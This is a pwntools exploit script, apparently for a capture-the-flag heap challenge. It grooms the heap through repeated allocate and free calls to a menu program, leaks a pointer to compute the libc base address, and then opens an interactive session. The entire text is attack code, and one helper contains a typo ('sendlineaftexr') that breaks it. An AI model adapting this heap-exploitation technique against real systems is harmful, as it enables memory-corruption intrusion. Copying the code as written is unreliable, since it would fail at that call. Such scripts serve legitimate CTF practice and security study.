from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./chall_patched')
libc = ELF('./libc.so.6', checksec=False)

p = elf.process()
gdb.attach(p, gdbscript=
'''
set resolve-heap-via-heuristic on
''')

def do(n):
    p.sendlineafter(b'? ', str(n//2).encode())

def send(a, b, x):
    p.sendlineaftexr(b'> ', str(x).encode())
    p.sendlineafter(b': ', str(a).encode())
    p.sendlineafter(b': ', str(b).encode())

def add(n):
    a = n // 2
    b = n // 2
    if n % 2: a += 1
    send(a, b, 1)

def sub(n):
    a = 128
    b = 128
    send(a, b, 2)

def div(n):
    a = n * 0x101
    b = 0x101
    send(a, b, 4)

def free(do='y'):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(y/n) ', do.encode())

def view():
    p.sendlineafter(b'> ', b'6')
    p.recvuntil(b'Result : ')
    return p.recvline(0).strip()

do(0x8)
free()
do(0x20)
free()
do(0x18)

for i in range(6):
    add(0x100)

add(0x431)
free()

do(0xf8)
free()
do(0xe8)
free()
do(0xd8)
free()
do(0xc8)
free()
do(0x50)
free()
do(0x40)
free()

do(0x20)
free()

do(0x30)

leak = int(view())
libc.address = leak - 0x1e0ff0
log.info(f'libc base: {hex(libc.address)}')

for i in range(5):
    add(0x100)

div(0x31)

p.interactive()